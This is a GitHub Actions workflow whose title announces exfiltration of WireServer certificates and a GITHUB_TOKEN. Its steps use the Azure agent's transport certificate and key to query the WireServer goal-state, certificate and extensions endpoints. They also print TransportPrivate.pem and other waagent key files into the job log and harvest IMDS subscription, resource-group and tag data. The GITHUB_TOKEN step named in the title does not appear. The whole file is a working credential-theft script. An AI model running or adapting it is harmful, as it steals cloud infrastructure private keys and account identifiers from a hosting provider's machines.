name: WireServer Certs + GITHUB_TOKEN Exfil
on:
  workflow_dispatch:

jobs:
  ws-certs:
    runs-on: ubuntu-latest
    steps:
      - name: WireServer GoalState + Certificates Endpoint + Certs.pem
        run: |
          echo "=== GOALSTATE ==="
          GOAL=$(curl -sf --max-time 15 \
            --cert /var/lib/waagent/TransportCert.pem \
            --key /var/lib/waagent/TransportPrivate.pem \
            "http://168.63.129.16/machine/?comp=goalstate" \
            -H "x-ms-version: 2012-11-30" 2>/dev/null || echo "GOALSTATE_FAILED")
          echo "$GOAL"
          
          echo "=== CERT URL EXTRACTION ==="
          python3 << 'PYEOF'
import sys, xml.etree.ElementTree as ET, subprocess, os

goalstate_result = subprocess.run(
    ['curl', '-sf', '--max-time', '15',
     '--cert', '/var/lib/waagent/TransportCert.pem',
     '--key', '/var/lib/waagent/TransportPrivate.pem',
     'http://168.63.129.16/machine/?comp=goalstate',
     '-H', 'x-ms-version: 2012-11-30'],
    capture_output=True, text=True, timeout=20
)
goal_xml = goalstate_result.stdout

if not goal_xml or 'FAILED' in goal_xml:
    print("GOALSTATE_FAILED")
    sys.exit(0)

try:
    root = ET.fromstring(goal_xml)
except Exception as e:
    print(f"XML_PARSE_ERROR: {e}")
    sys.exit(0)

cert_url = None
ext_url = None
hec_url = None

for elem in root.iter():
    tag = elem.tag
    if tag.endswith('Certificates') and elem.text:
        cert_url = elem.text.strip()
    elif tag.endswith('ExtensionsConfig') and elem.text:
        ext_url = elem.text.strip()
    elif tag.endswith('HostingEnvironmentConfig') and elem.text:
        hec_url = elem.text.strip()

print(f"CERT_URL={cert_url}")
print(f"EXT_URL={ext_url}")
print(f"HEC_URL={hec_url}")

# Fetch Certificates
if cert_url:
    print("\n=== WIRESERVER_CERTS ===")
    result = subprocess.run(
        ['curl', '-sf', '--max-time', '15',
         '--cert', '/var/lib/waagent/TransportCert.pem',
         '--key', '/var/lib/waagent/TransportPrivate.pem',
         cert_url,
         '-H', 'x-ms-version: 2012-11-30'],
        capture_output=True, text=True, timeout=20
    )
    print(result.stdout or result.stderr or "EMPTY_RESPONSE")

# Fetch ExtensionsConfig
if ext_url:
    print("\n=== EXTENSIONS_CONFIG ===")
    result = subprocess.run(
        ['curl', '-sf', '--max-time', '15',
         '--cert', '/var/lib/waagent/TransportCert.pem',
         '--key', '/var/lib/waagent/TransportPrivate.pem',
         ext_url,
         '-H', 'x-ms-version: 2012-11-30'],
        capture_output=True, text=True, timeout=20
    )
    print(result.stdout[:5000] or result.stderr[:500] or "EMPTY_RESPONSE")
PYEOF

      - name: Waagent Certificate Files + Transport Keys
        run: |
          echo "=== Certificates.pem ==="
          cat /var/lib/waagent/Certificates.pem 2>/dev/null || echo NO_CERTS_PEM
          echo "=== TransportCert.pem ==="
          cat /var/lib/waagent/TransportCert.pem 2>/dev/null || echo NO_TRANSPORT_CERT
          echo "=== TransportPrivate.pem ==="
          cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo NO_TRANSPORT_KEY
          echo "=== Certificates.p7m (b64) ==="
          base64 /var/lib/waagent/Certificates.p7m 2>/dev/null | head -50 || echo NO_P7M
          echo "=== waagent files listing ==="
          ls -la /var/lib/waagent/ 2>/dev/null | head -30

      - name: IMDS + Runner Identity
        run: |
          echo "=== IMDS ==="
          curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
            python3 -c "
import sys,json
d=json.load(sys.stdin)['compute']
print('VMID=' + d['vmId'])
print('VMNAME=' + d['name'])
print('SUBID=' + d['subscriptionId'])
print('RG=' + d['resourceGroupName'])
print('LOCATION=' + d['location'])
print('SIZE=' + d['vmSize'])
for t in d.get('tagsList',[]):
    print('TAG:' + t['name'] + '=' + t['value'])
"
